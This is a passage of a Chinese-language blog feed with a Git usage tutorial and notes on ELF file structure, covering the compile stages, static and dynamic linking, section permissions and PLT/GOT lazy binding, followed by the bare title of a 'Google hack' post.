        <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><h3 id="什么是版本控制？"><a href="#什么是版本控制？" class="headerlink" title="什么是版本控制？"></a>什么是版本控制？</h3><p>版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。</p><ul><li>实现跨区域多人协同开发</li><li>追踪和记载一个或者多个文件的历史记录</li><li>组织和保护你的源代码和文档</li><li>统计工作量</li><li>并行开发、提高开发效率</li><li>跟踪记录整个软件的开发过程</li><li>减轻开发人员的负担，节省时间，同时降低人为错误</li></ul><p>简单说就是用于管理多人协同开发项目的技术。</p><p>没有进行版本控制或者版本控制本身缺乏正确的流程管理，在软件开发过程中将会引入很多问题，如软件代码的一致性、软件内容的冗余、软件过程的事物性、软件开发过程中的并发性、软件源代码的安全性，以及软件的整合等问题。</p><p>无论是工作还是学习，或者是自己做笔记，都经历过这样一个阶段！我们就迫切需要一个版本控制工具！</p><h3 id="版本控制分类"><a href="#版本控制分类" class="headerlink" title="版本控制分类"></a>版本控制分类</h3><p><strong>分布式版本控制 Git</strong></p><p>每个人都拥有全部的代码！安全隐患！</p><p>所有版本信息仓库全部同步到本地的每个用户，这样就可以在本地查看所有版本历史，可以离线在本地提交，只需在连网时push到相应的服务器或其他用户那里。由于每个用户那里保存的都是所有的版本数据，只要有一个用户的设备没有问题就可以恢复所有的数据，但这增加了本地存储空间的占用。</p><p>不会因为服务器损坏或者网络问题，造成不能工作的情况！</p><h2 id="启动Git"><a href="#启动Git" class="headerlink" title="启动Git"></a>启动Git</h2><p>安装成功后在开始菜单中会有Git项，菜单下有3个程序：任意文件夹下右键也可以看到对应的程序！</p><p><strong>Git Bash</strong>：Unix与Linux风格的命令行，使用最多，推荐最多</p><p><strong>Git CMD</strong>：Windows风格的命令行</p><p><strong>Git GUI</strong>：图形界面的Git，不建议初学者使用，尽量先熟悉常用命令</p><h3 id="Git配置"><a href="#Git配置" class="headerlink" title="Git配置"></a>Git配置</h3><p>所有的配置文件，其实都保存在本地！</p><p>查看不同级别的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看系统config</span></span><br><span class="line">git config --system --list</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前用户（global）配置</span></span><br><span class="line">git config --global  --list</span><br><span class="line"><span class="comment">## 基本设置</span></span><br></pre></td></tr></table></figure><p><strong>配置用户信息</strong> 此节设置用户名与邮箱（用户标识，必要）。 当你安装Git后首先要做的事情是设置你的用户名称和e-mail地址。这是非常重要的，因为每次Git提交都会使用该信息。它被永远的嵌入到了你的提交中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;hungs&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;hungs@acbug.cn&quot;</span></span><br></pre></td></tr></table></figure><p>只需要做一次这个设置，如果你传递了—global 选项，因为Git将总是会使用该信息来处理你在系统中所做的一切操作。如果你希望在一个特定的项目中使用不同的名称或e-mail地址，你可以在该项目中运行该命令而不要—global选项。总之—global为全局配置，不加为某个项目的特定配置。</p><h3 id="4个区域"><a href="#4个区域" class="headerlink" title="4个区域 #"></a>4个区域 <a href="https://wiki.wgpsec.org/knowledge/base/git-base.html#_4个区域">#</a></h3><p>Git本地有4个工作区域：</p><ul><li>Workspace：工作区，就是你平时存放项目代码的地方</li><li>Index / Stage：暂存区，用于临时存放你的改动，事实上它只是一个文件，保存即将提交到文件列表信息</li><li>Repository：仓库区（或本地仓库）**，就是安全存放数据的位置，这里面有你提交到所有版本的数据。其中HEAD指向最新放入仓库的版本</li><li>Remote：远程仓库，托管代码的服务器**，可以简单的认为是你项目组中的一台电脑用于远程数据交换</li></ul><p><img src="https://wiki.wgpsec.org/images/git-base/Transformational-Relation.jpg" alt="img"></p><ul><li>Directory：使用Git管理的一个目录，也就是一个仓库，包含我们的工作空间和Git的管理空间。</li><li>WorkSpace：需要通过Git进行版本控制的目录和文件，这些目录和文件组成了工作空间。</li><li>.git：存放Git管理信息的目录，初始化仓库的时候自动创建。</li><li>Index/Stage：暂存区，或者叫待提交更新区，在提交进入repo之前，我们可以把所有的更新放在暂存区。</li><li>Local Repo：本地仓库，一个存放在本地的版本库；HEAD会只是当前的开发分支（branch）。</li><li>Stash：隐藏，是一个工作状态保存栈，用于保存/恢复WorkSpace中的临时状态。</li></ul><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>git的工作流程一般是这样的： １、在工作目录中添加、修改文件； ２、将需要进行版本管理的文件放入暂存区域； ３、将暂存区域的文件提交到git仓库。</p><p>因此，git管理的文件有三种状态： 已修改（modified）, 已暂存（staged）, 已提交(committed)</p><h3 id="工作目录"><a href="#工作目录" class="headerlink" title="工作目录"></a>工作目录</h3><p>工作目录（WorkSpace)一般就是你希望Git帮助你管理的文件夹，可以是你项目的目录，也可以是一个空目录，建议不要有中文。</p><h2 id="本地仓库搭建"><a href="#本地仓库搭建" class="headerlink" title="本地仓库搭建"></a>本地仓库搭建</h2><p>接下来，创建仓库。创建本地仓库的方法有两种：一种是创建全新的仓库，另一种是克隆远程仓库。</p><h3 id="初始化版本控制"><a href="#初始化版本控制" class="headerlink" title="初始化版本控制"></a>初始化版本控制</h3><p>创建全新的仓库,需要用GIT管理的项目的根目录执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="comment">#每个项目只一次</span></span><br></pre></td></tr></table></figure><p>执行后可以看到，仅仅在项目目录多出了一个.git目录，关于版本等的所有信息都在这个目录里面。</p><h3 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h3><p>另一种方式是克隆远程目录，由于是将远程服务器上的仓库完全镜像一份至本地！</p><blockquote><p>克隆一个项目和它的整个代码历史(版本信息)</p><p>$ git clone <a href="https://gitee.com/kuangstudy/openclass.git">https://gitee.com/kuangstudy/openclass.git</a></p></blockquote><h2 id="Git文件操作"><a href="#Git文件操作" class="headerlink" title="Git文件操作"></a>Git文件操作</h2><h3 id="文件的四种状态"><a href="#文件的四种状态" class="headerlink" title="文件的四种状态"></a>文件的四种状态</h3><p>版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。</p><ul><li><strong>Untracked</strong>: 未跟踪, 此文件在文件夹中, 但并没有加入到git库, 不参与版本控制. 通过git add 状态变为Staged.</li><li><strong>Unmodify</strong>: 文件已经入库, 未修改, 即版本库中的文件快照内容与文件夹中完全一致. 这种类型的文件有两种去处, 如果它被修改, 而变为Modified. 如果使用git rm移出版本库, 则成为Untracked文件</li><li><strong>Modified</strong>: 文件已修改, 仅仅是修改, 并没有进行其他的操作. 这个文件也有两个去处, 通过git add可进入暂存staged状态, 使用git checkout 则丢弃修改过, 返回到unmodify状态, 这个git checkout即从库中取出文件, 覆盖当前修改 !</li><li><strong>Staged</strong>: 暂存状态. 执行git commit则将修改同步到库中, 这时库中的文件和本地文件又变为一致, 文件为Unmodify状态. 执行git reset HEAD filename取消暂存, 文件状态为Modified</li></ul><h3 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h3><p>上面说文件有4种状态，通过如下命令可以查看到文件的状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- [file]<span class="comment">#将Modified的文件回滚至Unmodify的状态。</span></span><br><span class="line"><span class="comment">#例如：</span></span><br><span class="line">git checkout -- ReadMe.md</span><br></pre></td></tr></table></figure><p><strong>添加文件追踪</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .   <span class="comment">#此命令为添加所有文件到暂存区.或者也可以更新提交的时候写单个文件或目录名。</span></span><br></pre></td></tr></table></figure><p><strong>提交文件 （-m 后表示说明内容，需要加引号）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git commit -m “这里是说明消息”    <span class="comment"># 提交暂存区中的内容到本地仓库 -m 提交信息</span></span><br><span class="line"><span class="comment"># Aborting commit:按住shift，同时敲击2下z键.Aborting commit会导致Commit失败。</span></span><br></pre></td></tr></table></figure><p>若git push 报错Everything up to date, 检查是不是忘记git commit -m 了。 <strong>查看当前修改状态</strong></p><p>常在执行 add 后，执行 commit 之前使用，也可以在 commit之后使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看指定文件状态</span></span><br><span class="line">git status [filename]</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看所有文件状态</span></span><br><span class="line">git status</span><br></pre></td></tr></table></figure><p><strong>其它常用参数</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下命令，在.git根目录工作区使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看历史记录</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对比两次提交的不同</span></span><br><span class="line">git diff commit_id</span><br><span class="line">git diff HEAD^</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到历史版本</span></span><br><span class="line">git reset commit_id</span><br><span class="line">git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看stash列表，保存到git栈的git 工作状态</span></span><br><span class="line">git stash list</span><br><span class="line">git stash pop<span class="comment">#从git栈中弹出内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#git stash list看不到的话</span></span><br><span class="line"><span class="built_in">cat</span> .git/refs/stash<span class="comment">#会有一个hash</span></span><br><span class="line">git diff <span class="built_in">hash</span>值<span class="comment">#即可看到内容差异</span></span><br></pre></td></tr></table></figure><h3 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h3><p>有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等</p><p>在主目录下建立”.gitignore”文件，此文件有如下规则：</p><ul><li>忽略文件中的空行或以井号（#）开始的行将会被忽略。</li><li>可以使用Linux通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等。</li><li>如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。</li><li>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。</li><li>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#为注释</span><br><span class="line">*.txt        #忽略所有 .txt结尾的文件,这样的话上传就不会被选中！</span><br><span class="line">!lib.txt     #但lib.txt除外</span><br><span class="line">/temp        #仅忽略项目根目录下的TODO文件,不包括其它目录temp。/ 在前面代表忽略上面。</span><br><span class="line">build/       #忽略build/目录下的所有文件。 / 在后面代表忽略下面。</span><br><span class="line">doc/*.txt    #会忽略 doc/notes.txt 但不包括 doc/server/arch.txt</span><br></pre></td></tr></table></figure><h3 id="将远端文件下载到本地"><a href="#将远端文件下载到本地" class="headerlink" title="将远端文件下载到本地"></a>将远端文件下载到本地</h3><p>本地有仓库:pull即可 本地无仓库:用不了pull。应使用clone，将远端仓库直接clone来。</p><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p><strong>1.登陆github账号</strong></p><p><strong>2.创建 SSH Key</strong></p><p>【C盘—-&gt;用户/user—-&gt;Administrator（自己的用户名）】</p><p>看看有没有 .ssh 目录，如果有，再看看这个目录下有没有 id_rsa 和 id_rsa.pub</p><p>如果已经有了，可直接跳到下一步。</p><p>如果没有，打开 Shell（Windows下打开Git Bash），创建 SSH Key：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xksec@foxmail.com&quot;</span></span><br></pre></td></tr></table></figure><p><strong>3.登陆 GitHub，打开 “Settings”</strong></p><p>“SSH Keys” 页面，“New SSH key”，“粘贴公钥”</p><p><strong>4.创建项目，并复制项目地址，添加远程仓库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https://github.com/wintrysec/wintrysec.github.io.git</span><br></pre></td></tr></table></figure><p><strong>5.把所有推送到远端仓库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="将Workspace文件传送到Remote"><a href="#将Workspace文件传送到Remote" class="headerlink" title="将Workspace文件传送到Remote"></a>将Workspace文件传送到Remote</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始化</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建仓库。此步也可GUI完成。</span></span><br><span class="line">$ git remote add origin https://gitee.com/用户个性地址/HelloGitee.git</span><br><span class="line"></span><br><span class="line"><span class="comment">#在新建仓库时，如果在 Gitee 平台仓库上已经存在 readme 或其他文件，在提交时可能会存在冲突，这时用户需要选择的是保留线上的文件或者舍弃线上的文件，如果您舍弃线上的文件，则在推送时选择强制推送，-f代表force，强制推送需要执行下面的命令(默认不推荐该行为)：</span></span><br><span class="line">$ git push origin master -f</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果您选择保留线上的 readme 文件,则需要先执行：</span></span><br><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#若出现以下报错</span></span><br><span class="line">error: src refspec master does not match any</span><br><span class="line"></span><br><span class="line"><span class="comment">#请使用</span></span><br><span class="line">git status <span class="comment">#以检查文件状态是否都是commited</span></span><br></pre></td></tr></table></figure><h2 id="更新远程仓库"><a href="#更新远程仓库" class="headerlink" title="更新远程仓库"></a>更新远程仓库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git pull<span class="comment">#拉取更新，每次必做防止团队合作干掉别人上传的代码</span></span><br><span class="line">git add .   <span class="comment">#更新文件后添加追踪</span></span><br><span class="line">git commit -m “这里是说明消息”</span><br><span class="line">git status<span class="comment">#查看当前修改状态</span></span><br><span class="line">git branch<span class="comment">#查看当前分支</span></span><br><span class="line">git push<span class="comment">#推送向远程仓库</span></span><br></pre></td></tr></table></figure><p><strong>分支管理</strong> <strong>分支在GIT中相对较难，分支就是科幻电影里面的平行宇宙，</strong>如果两个平行宇宙互不干扰，那对现在的你也没啥影响。不过，在某个时间点，两个平行宇宙合并了，我们就需要处理一些问题了！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git branch<span class="comment">#查看当前所有本地分支</span></span><br><span class="line">git branch -r        <span class="comment"># 列出所有远程分支。-r代表remote。</span></span><br><span class="line">git branch -a       <span class="comment">#列出所有分支，包含本地和remote，-a代表all </span></span><br><span class="line">git branch -d [branch-name]    <span class="comment"># 删除分支</span></span><br><span class="line">git branch [branch-name]    <span class="comment"># 新建一个分支，但依然停留在当前分支</span></span><br><span class="line"></span><br><span class="line">git chechout aaa <span class="comment">#切换分支aaa</span></span><br><span class="line">git chechout -b aaa <span class="comment">#本地创建 aaa分支，同时切换到aaa分支</span></span><br><span class="line"><span class="comment">#只有提交的时候才会在服务端上创建一个分支</span></span><br><span class="line"></span><br><span class="line">git merge [branch]    <span class="comment"># 合并指定分支到当前分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程分支</span></span><br><span class="line">git push origin --delete [branch-name]</span><br><span class="line">git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure><p>如果同一个文件在合并分支时都被修改了则会引起冲突：解决的办法是我们可以修改冲突文件后重新提交！选择要保留他的代码还是你的代码！</p><p>master主分支应该非常稳定，用来发布新版本，一般情况下不允许在上面工作，工作一般情况下在新建的dev分支上工作，工作完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF-file</title>
      <link href="/posts/6eec.html"/>
      <url>/posts/6eec.html</url>
      
        <content type="html"><![CDATA[<h1 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h1><h2 id="从源码到可执行文件"><a href="#从源码到可执行文件" class="headerlink" title="从源码到可执行文件"></a>从源码到可执行文件</h2><p>预处理 -&gt;  编译 -&gt;  汇编 -&gt;  链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -E filename.c &gt; filename.i   ; preprocessed source</span><br><span class="line">gcc -S filename.i &gt; filename.s   ; assembly code</span><br><span class="line">gcc -c filename.s &gt; filename.o   ; object file</span><br><span class="line">gcc    filename.o &gt; filename.out ; binary executable</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/27/GxJgekF2yHl9PQZ.png" alt="image-20230827232641398"></p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><h4 id="静态链接-（编译后完成）"><a href="#静态链接-（编译后完成）" class="headerlink" title="静态链接 （编译后完成）"></a>静态链接 （编译后完成）</h4><p>可移植性强，文件大</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc file.c -static -o bin</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/27/MGlfZavV3mpwRNh.png" alt="image-20230827232301660"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00000000400000 0x00000000401000 0x00000000000000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x00000000401000 0x00000000479000 0x00000000001000 r-x /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x00000000479000 0x000000004a0000 0x00000000079000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a0000 0x000000004a4000 0x000000000a0000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a4000 0x000000004a7000 0x000000000a4000 rw- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a7000 0x000000004ce000 0x00000000000000 rw- [heap]</span><br><span class="line">0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure><h4 id="动态链接-（程序加载后完成）"><a href="#动态链接-（程序加载后完成）" class="headerlink" title="动态链接 （程序加载后完成）"></a>动态链接 （程序加载后完成）</h4><p>可移植性差，文件小</p><p><img src="https://s2.loli.net/2023/08/27/NXKcJuv5g6SbFzW.png" alt="0x3"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00555555554000 0x00555555555000 0x00000000000000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555555000 0x00555555556000 0x00000000001000 r-x /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555556000 0x00555555557000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555557000 0x00555555558000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555558000 0x00555555559000 0x00000000003000 rw- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x007ffff7dc3000 0x007ffff7dc6000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7dc6000 0x007ffff7dec000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7dec000 0x007ffff7f41000 0x00000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f41000 0x007ffff7f94000 0x0000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f94000 0x007ffff7f98000 0x000000001ce000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f98000 0x007ffff7f9a000 0x000000001d2000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f9a000 0x007ffff7fa7000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7fc3000 0x007ffff7fc5000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7fc5000 0x007ffff7fc9000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7fc9000 0x007ffff7fcb000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffff7fcb000 0x007ffff7fcc000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7fcc000 0x007ffff7ff1000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ff1000 0x007ffff7ffb000 0x00000000026000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ffb000 0x007ffff7ffd000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ffd000 0x007ffff7fff000 0x00000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure><h2 id="重要节信息"><a href="#重要节信息" class="headerlink" title="重要节信息"></a>重要节信息</h2><div class="table-container"><table><thead><tr><th style="text-align:center">Section</th><th style="text-align:center">说明</th><th style="text-align:center">权限</th></tr></thead><tbody><tr><td style="text-align:center">.init</td><td style="text-align:center">初始化代码，先于main执行</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.fini</td><td style="text-align:center">结束代码，在最后执行</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.text</td><td style="text-align:center">程序汇编指令</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.rodata</td><td style="text-align:center">存放只读数据，一般是字符串常量（代码中直接使用的字符串也算）</td><td style="text-align:center">R__</td></tr><tr><td style="text-align:center">.data</td><td style="text-align:center">保存已经初始化（非零初始化）的全局变量和静态局部变量</td><td style="text-align:center">RW_</td></tr><tr><td style="text-align:center">.bss</td><td style="text-align:center">未初始化（零初始化）的全局变量和静态局部变量保存在bss段</td><td style="text-align:center">RW_</td></tr><tr><td style="text-align:center">.got</td><td style="text-align:center">Global Offset Table  存放外部符号的实际偏移</td><td style="text-align:center">RW_</td></tr><tr><td style="text-align:center">.got.plt</td><td style="text-align:center">和.plt共同发挥作用，存放.plt所需的偏移量</td><td style="text-align:center">RW_ \</td><td>R__ (full-RELRO)</td></tr><tr><td style="text-align:center">.plt</td><td style="text-align:center">Procedure Linkage Table程序链接表   作为跳板调用外部函数  要么在<code>.got.plt</code>节中拿到地址，并跳转。要么当<code>.got.plt</code>没有所需地址的时候，触发链接器去找到所需的地址</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.plt.got</td><td style="text-align:center">仅当开启full-RELRO时出现</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.dynamic</td><td style="text-align:center">存储动态链接器的加载</td></tr></tbody></table></div><p><img src="https://s2.loli.net/2023/08/27/mQS3Ga57iKkUbCz.png" alt="image-20230827232449734"><br><img src="https://s2.loli.net/2023/08/27/qy8sxw5FQHpjOCb.png" alt="image-20230827232508378"></p><h3 id="调用外部函数时plt和got行为"><a href="#调用外部函数时plt和got行为" class="headerlink" title="调用外部函数时plt和got行为"></a>调用外部函数时plt和got行为</h3><p>调用外部函数，首先都跳转至对应PLT区，再跳转至对应GOT区</p><ul><li><p>若为首次调用该函数</p><p><img src="https://s2.loli.net/2023/08/27/rSqp2xoefcFDmQt.png" alt="0x6"></p><ol><li>依次跳转到 printf@plt 和 printf@got</li><li>由got跳转至 printf@plt+6   </li><li>跳转至_plt</li><li>再跳转到 resolve 函数获取 printf 函数的绝对地址，将地址存入got表（准确来说是.got.plt）并执行printf</li></ol></li><li><p>非首次调用</p><p>call func -&gt; func@plt -&gt; func@got -&gt; 真实地址</p></li></ul><blockquote><p>参考</p><p><a href="https://hackthedeveloper.com/c-program-compilation-process/">https://hackthedeveloper.com/c-program-compilation-process/</a></p><p><a href="https://www.matteomalvica.com/minutes/binary_analysis/">https://www.matteomalvica.com/minutes/binary_analysis/</a></p><p><a href="https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/</a></p><p><a href="https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/">https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google hack</title>
      <link href="/posts/fd6a.html"/>
      <url>/posts/fd6a.html</url>
      
